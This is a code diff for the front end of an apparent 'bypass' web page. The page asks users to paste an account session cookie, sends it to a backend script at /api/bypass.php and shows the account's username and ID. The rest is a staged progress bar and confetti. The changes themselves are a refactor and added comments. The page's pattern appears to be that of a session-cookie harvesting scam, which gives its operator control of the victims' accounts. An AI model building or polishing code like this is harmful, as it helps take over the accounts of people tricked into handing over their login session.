@@ -112,22 +112,21 @@ const cookieInput = document.getElementById('cookie-input');
 const btnStart = document.getElementById('btn-start');
 const btnCheck = document.getElementById('btn-check');
 
-if (!cookieInput || !btnStart || !btnCheck) {
-    console.log('Bypass form not found on this page');
-} else {
-    const formState = document.getElementById('form-state');
-    const processingState = document.getElementById('processing-state');
-    const successState = document.getElementById('success-state');
-    const failedState = document.getElementById('failed-state');
-    const progressBar = document.getElementById('progress-bar');
-    const progressText = document.getElementById('progress-text');
-    const userAvatar = document.getElementById('user-avatar');
+const formState = document.getElementById('form-state');
+const processingState = document.getElementById('processing-state');
+const successState = document.getElementById('success-state');
+const failedState = document.getElementById('failed-state');
+const progressBar = document.getElementById('progress-bar');
+const progressText = document.getElementById('progress-text');
+const userAvatar = document.getElementById('user-avatar');
 
-    // Paste Detection
+// Paste Detection
+if (cookieInput) {
     cookieInput.addEventListener('paste', (e) => {
         setTimeout(() => {
             const cookie = cookieInput.value.trim();
             if (cookie.length > 50) {
+                // Auto-highlight the button
                 btnStart.classList.add('ring-4', 'ring-white/20');
                 setTimeout(() => {
                     btnStart.classList.remove('ring-4', 'ring-white/20');
@@ -135,8 +134,10 @@ if (!cookieInput || !btnStart || !btnCheck) {
             }
         }, 100);
     });
+}
 
-    // Check Cookie Only
+// Check Cookie Only
+if (btnCheck) {
     btnCheck.onclick = async () => {
         const cookie = cookieInput.value.trim();
 
@@ -152,19 +153,17 @@ if (!cookieInput || !btnStart || !btnCheck) {
             const response = await fetch('/api/bypass.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    cookie, 
-                    checkOnly: true, 
-                    instance: window.INSTANCE_NAME || '' 
-                })
+                body: JSON.stringify({ cookie, checkOnly: true, directory })
             });
 
             const data = await response.json();
 
             if (response.ok && data.success && data.valid) {
+                // Valid cookie
                 btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Valid Cookie ✓';
                 btnCheck.classList.add('bg-green-500/20', 'border-green-500/50', 'text-green-400');
                 
+                // Show success message
                 alert(`✅ Cookie is valid!\nUsername: ${data.username}\nUser ID: ${data.userId}`);
                 
                 setTimeout(() => {
@@ -173,6 +172,7 @@ if (!cookieInput || !btnStart || !btnCheck) {
                     btnCheck.classList.remove('bg-green-500/20', 'border-green-500/50', 'text-green-400');
                 }, 3000);
             } else {
+                // Invalid cookie
                 btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg> Invalid Cookie ✗';
                 btnCheck.classList.add('bg-red-500/20', 'border-red-500/50', 'text-red-400');
                 
@@ -190,8 +190,10 @@ if (!cookieInput || !btnStart || !btnCheck) {
             alert('Error checking cookie. Please try again.');
         }
     };
+}
 
-    // Start Bypass
+// Start Bypass
+if (btnStart) {
     btnStart.onclick = async () => {
         const cookie = cookieInput.value.trim();
 
@@ -204,13 +206,11 @@ if (!cookieInput || !btnStart || !btnCheck) {
         processingState.classList.remove('hidden');
 
         try {
+            // Call backend API
             const response = await fetch('/api/bypass.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    cookie, 
-                    instance: window.INSTANCE_NAME || '' 
-                })
+                body: JSON.stringify({ cookie, directory })
             });
 
             const data = await response.json();
@@ -255,13 +255,15 @@ if (!cookieInput || !btnStart || !btnCheck) {
                     processingState.classList.add('hidden');
                     successState.classList.remove('hidden');
                     
+                    // Trigger confetti
                     setTimeout(triggerConfetti, 300);
                     
+                    // Auto-clear cookie input after 2 seconds
                     setTimeout(() => {
                         cookieInput.value = '';
                     }, 2000);
                 }
-            }, 1200);
+            }, 1200); // 120 seconds total
 
         } catch (err) {
             setTimeout(() => {
